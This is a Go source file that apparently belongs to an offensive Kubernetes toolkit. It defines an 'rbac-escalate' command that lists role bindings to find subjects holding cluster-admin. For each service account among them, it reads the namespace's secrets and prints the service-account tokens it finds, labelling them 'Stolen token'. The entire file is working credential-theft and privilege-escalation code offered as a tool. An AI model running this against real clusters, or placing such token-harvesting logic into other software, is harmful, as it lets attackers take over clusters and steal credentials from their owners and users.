package modules

import (
	"context"
	"fmt"
	"strings"

	"github.com/spf13/cobra"
	corev1 "k8s.io/api/core/v1"
	v1 "k8s.io/api/rbac/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/tools/clientcmd"
)

var (
	kubeConfig string

	// RBACEscalateCmd represents the RBAC privilege escalation command
	RBACEscalateCmd = &cobra.Command{
		Use:   "rbac-escalate",
		Short: "Attempt to escalate privileges using RBAC misconfigurations",
		Long:  `Searches for and exploits RBAC misconfigurations to escalate privileges in the Kubernetes cluster`,
		Run: func(cmd *cobra.Command, args []string) {
			if err := RBACEscalate(kubeConfig); err != nil {
				fmt.Printf("[-] Error during RBAC escalation: %v\n", err)
			}
		},
	}
)

func init() {
	RBACEscalateCmd.Flags().StringVar(&kubeConfig, "kubeconfig", "", "Path to the kubeconfig file (required)")
	RBACEscalateCmd.MarkFlagRequired("kubeconfig")
}

func RBACEscalate(kubeconfig string) error {
	config, err := clientcmd.BuildConfigFromFlags("", kubeconfig)
	if err != nil {
		return fmt.Errorf("error loading kubeconfig: %v", err)
	}
	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return fmt.Errorf("failed to create clientset: %v", err)
	}

	fmt.Println("[*] Searching for cluster-admin rolebindings...")
	rbs, err := clientset.RbacV1().RoleBindings("").List(context.TODO(), metav1.ListOptions{})
	if err != nil {
		return err
	}
	crbs, err := clientset.RbacV1().ClusterRoleBindings().List(context.TODO(), metav1.ListOptions{})
	if err != nil {
		return err
	}

	var vulnerableSubjects []v1.Subject
	for _, rb := range rbs.Items {
		if rb.RoleRef.Kind == "ClusterRole" && rb.RoleRef.Name == "cluster-admin" {
			vulnerableSubjects = append(vulnerableSubjects, rb.Subjects...)
		}
	}
	for _, crb := range crbs.Items {
		if crb.RoleRef.Kind == "ClusterRole" && crb.RoleRef.Name == "cluster-admin" {
			vulnerableSubjects = append(vulnerableSubjects, crb.Subjects...)
		}
	}

	if len(vulnerableSubjects) == 0 {
		fmt.Println("[-] No RBAC privilege escalation paths found.")
		return nil
	}

	fmt.Println("[+] Found possible privilege escalation vectors:")
	for _, s := range vulnerableSubjects {
		fmt.Printf("    - Kind: %s, Name: %s, Namespace: %s\n", s.Kind, s.Name, s.Namespace)
	}

	for _, s := range vulnerableSubjects {
		if s.Kind == "ServiceAccount" {
			fmt.Printf("[+] Attempting token theft from ServiceAccount: %s in namespace %s\n", s.Name, s.Namespace)
			secrets, err := clientset.CoreV1().Secrets(s.Namespace).List(context.TODO(), metav1.ListOptions{})
			if err != nil {
				continue
			}
			for _, sec := range secrets.Items {
				if sec.Type == corev1.SecretTypeServiceAccountToken && strings.Contains(sec.Name, s.Name) {
					token := sec.Data["token"]
					fmt.Printf("[+] Stolen token from %s/%s: %s\n", s.Namespace, s.Name, string(token))
				}
			}
		}
	}
	return nil
}
